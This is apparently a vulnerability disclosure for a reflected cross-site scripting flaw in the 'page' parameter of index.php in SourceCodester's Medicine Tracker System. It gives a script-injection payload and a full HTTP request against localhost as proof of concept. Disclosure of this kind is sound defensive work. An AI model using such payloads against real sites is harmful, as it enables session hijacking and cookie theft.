**BUG_Author:**

Rone

**Vendor:**

[SourceCodester](https://vuldb.com/?vendor.sourcecodester)

**Software:**

[Medicine Tracker System in PHP (OOP) and MySQL DB Source Code Free Download | SourceCodester](https://www.sourcecodester.com/php/16308/medicine-tracker-system-php-oop-and-mysql-db-source-code-free-download.html)

**Vulnerability File:**
index.php

**Description:**

A vulnerability has been found in Medicine Tracker System (the affected version is unknown) and classified as problematic. Affected by this vulnerability is an unknown code of the file index.php. The manipulation of the argument with the input value leads to a cross site scripting vulnerability. The CWE definition for the vulnerability is CWE-79. The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. As an impact it is known to affect integrity. page=1"><ScRiPt>alert(document.cookie)</ScRiPt>

```
GET /php-mts/index.php?page=1"><ScRiPt%20>alert(document.cookie)</ScRiPt> HTTP/1.1
Referer: http://127.0.0.1/php-mts/
Cookie: PHPSESSID=5bbgjmttr2vr0o38hhrad8jfb6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
Host: 127.0.0.1
Connection: Keep-alive
```

![image-20231012000348639](https://github.com/GodRone/MedicineTrackerSystem/blob/main/Medicine%20Tracker%20System_XSS.assets/image-20231012000348639.png)

















